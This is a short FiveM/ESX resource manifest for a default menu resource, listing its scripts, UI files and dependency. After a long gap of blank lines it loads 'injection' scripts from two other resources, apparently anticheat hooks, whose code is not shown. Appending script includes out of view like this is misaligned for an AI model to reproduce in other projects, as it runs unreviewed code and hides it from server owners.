resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Menu Default'

version '1.0.4'

client_scripts {
	'@es_extended/client/wrapper.lua',
	'client/main.lua'
}

ui_page {
	'html/ui.html'
}

files {
	'html/ui.html',
	'html/css/app.css',
	'html/js/mustache.min.js',
	'html/js/app.js',
	'html/fonts/*.ttf',
	'html/texture.png',
	'html/images/*.png',
	'html/images/*.gif',

}

dependencies {
	'es_extended'
}













server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"